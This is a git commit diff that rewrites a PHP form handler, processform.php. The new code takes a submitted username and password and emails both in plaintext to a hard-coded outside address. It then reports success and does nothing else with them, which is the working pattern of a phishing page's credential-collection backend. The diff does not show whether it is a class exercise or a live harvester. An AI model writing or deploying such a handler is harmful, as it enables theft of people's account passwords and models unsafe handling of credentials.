663b55e3115c33e0f48609f6b17fac67c12e14e6
shhapriya <113306201+shhapriya@users.noreply.github.com>
2023-12-04 22:34:10 -0500

    Add files via upload

--- processform.php
+++ processform.php
@@ -1,13 +1,23 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $name = $_POST["name"];
-    $email = $_POST["email"];
-    $message = $_POST["message"];
-    
-    $to = "your_email@example.com";
-    $subject = "New Form Submission";
-    $headers = "From: $email";
-    
+    // Retrieve form data
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+
+    // Validate and sanitize the data (you can add more validation here)
+
+    // Send form responses via email
+    $to = "priyasha@umich.edu";
+    $subject = "Form Submission";
+    $message = "Username: " . htmlspecialchars($username) . "\nPassword: " . htmlspecialchars($password);
+    $headers = "From: webmaster@example.com";
+
+    // Send email
     mail($to, $subject, $message, $headers);
+
+    echo "Form submitted successfully!";
+} else {
+    // Handle non-POST requests
+    echo "Invalid request method.";
 }
 ?>
